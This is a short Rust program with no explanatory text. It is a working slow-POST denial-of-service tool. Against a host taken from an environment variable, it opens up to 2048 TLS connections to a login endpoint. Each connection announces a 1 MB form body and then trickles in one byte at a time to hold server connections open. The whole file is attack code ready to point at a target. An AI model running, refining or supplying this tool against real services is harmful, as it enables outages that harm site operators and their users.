extern crate native_tls;
use native_tls::TlsConnector;
use std::env;
use std::io::Write;
use std::net::TcpStream;
use std::thread;
use std::time::Duration;
use std::sync::{Arc, Mutex};

fn main() {
    let host = env::var("HOST").unwrap();
    let port = "443";
    let connections_count = 2048;

    let true_streams = Arc::new(Mutex::new(Vec::with_capacity(connections_count)));
    let streams = true_streams.to_owned();
    let connections_producer = thread::spawn(move || {
        let start = format!("POST /api/v3/user/login HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\nContent-Length: 1000000\r\n\r\nemail=", host);
        for _ in 0..connections_count {
            thread::sleep(Duration::from_millis(500));
            let connector = TlsConnector::builder().unwrap().build().unwrap();
            let stream = TcpStream::connect(format!("{}:{}", host, port)).unwrap();
            let mut stream = connector.connect(&host, stream).unwrap();
            let _  = stream.write(start.as_bytes());
            streams.lock().unwrap().push(stream);
        }
    });

    let streams = true_streams.to_owned();
    loop {
        thread::sleep(Duration::from_millis(10));
        for (index, stream) in streams.lock().unwrap().iter_mut().enumerate() {
            stream.write(b"a");
            stream.flush();
            println!("Stream number: {} written.", index)
        }
    }
}